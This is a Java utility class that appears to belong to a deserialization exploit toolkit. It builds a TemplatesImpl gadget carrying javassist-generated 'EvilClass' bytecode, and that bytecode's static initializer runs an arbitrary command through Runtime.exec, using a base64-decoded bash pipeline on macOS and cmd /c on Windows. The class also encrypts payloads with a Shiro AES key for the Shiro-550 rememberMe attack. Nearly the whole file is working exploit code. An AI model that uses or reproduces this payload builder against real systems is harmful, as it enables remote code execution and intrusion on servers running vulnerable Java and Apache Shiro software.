package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.shiro.crypto.AesCipherService;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Utils {
    public static String serialize(Object object ,String filename) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream(filename);
        barr.writeTo(fos);
        fos.close();

//        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));

        return Base64.getEncoder().encodeToString(barr.toByteArray());
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object result = ois.readObject();
        ois.close();

        return result;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl createTemplatesImpl(String cmd) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Utils.getEvilPayload(cmd);
        setValue(templates,"_name","aaa");
        // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
        setValue(templates,"_bytecodes",new byte[][]{bytes});
        setValue(templates,"_tfactory",new TransformerFactoryImpl());

        return templates;
    }

    public static byte[] getEvilPayload(String cmd) throws Exception {
        String cmdBase64 = new String(Base64.getEncoder().encode(cmd.getBytes()));

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("EvilClass");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClass);

        String os = System.getProperty("os.name").toLowerCase();
        String evilBlock = "INIT";

        if (os.contains("mac")) {
            evilBlock = String.format(
                    "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");",
                    cmdBase64
            );
        } else if (os.contains("win")) {
            evilBlock = String.format(
                    "Runtime.getRuntime().exec(\"cmd /c %s\");",
                    cmd
            );
        }
        System.out.println(evilBlock);
        clazz.makeClassInitializer().insertBefore(evilBlock);

        return clazz.toBytecode();

    }

    // 不调用构造方法创建对象
    public static Object createObjectWithoutConstructor(Class clazz) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Constructor<Object> constructor = Object.class.getDeclaredConstructor();
        Constructor<?> constructor1 = reflectionFactory.newConstructorForSerialization(clazz ,constructor);
        constructor1.setAccessible(true);

        return constructor1.newInstance();
    }

    public static String shiro550Encode(String key, String payload){
        // 不同的shiro版本的加密方法有差异，需要根据shiro版本打反序列化
        AesCipherService aes = new AesCipherService();
        byte[] keyBytes = Base64.getDecoder().decode(key);

        return aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString();
    }
}
